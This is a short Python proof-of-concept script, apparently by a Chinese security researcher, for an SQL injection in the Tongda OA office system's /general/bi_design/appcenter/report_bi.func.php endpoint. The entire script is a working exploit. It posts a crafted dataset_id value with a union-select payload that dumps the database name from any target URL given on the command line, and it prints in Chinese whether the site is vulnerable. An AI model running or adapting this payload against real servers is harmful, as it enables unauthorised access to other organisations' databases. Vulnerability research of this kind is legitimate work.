#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/general/bi_design/appcenter/report_bi.func.php"
    burp0_headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"}
    burp0_data = f"_POST[dataset_id]=efgh'-@`'`)union+select+1,2,database()#'&action=get_link_info"
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    #print(r.text)
    if r.status_code == 200:
        return r.json()
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 tongda-report-bi-func-sql-inject.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行 select+1,2,database() 结果为：", info)
    else:
        print("[-]漏洞不存在")
